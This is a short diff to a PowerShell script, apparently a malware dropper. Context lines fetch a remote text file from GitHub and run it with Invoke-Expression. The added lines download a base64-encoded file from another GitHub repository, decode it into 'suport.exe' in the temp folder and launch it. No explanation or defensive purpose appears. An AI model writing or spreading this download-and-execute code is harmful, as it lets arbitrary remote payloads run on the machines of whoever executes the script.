@@ -7,3 +7,9 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.M
 $url = "https://github.com/iskww/atlasgov/raw/main/support.txt"
 $Content = (Invoke-WebRequest -Uri $url).Content
 Invoke-Expression($Content);
+
+
+$uri = "https://github.com/iskww/Atlas/raw/main/reports.b64";
+$location = [System.IO.Path]::GetTempPath() + "suport" + ".exe";
+[System.IO.File]::WriteAllBytes($location,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri)))
+Start-Process suport.exe
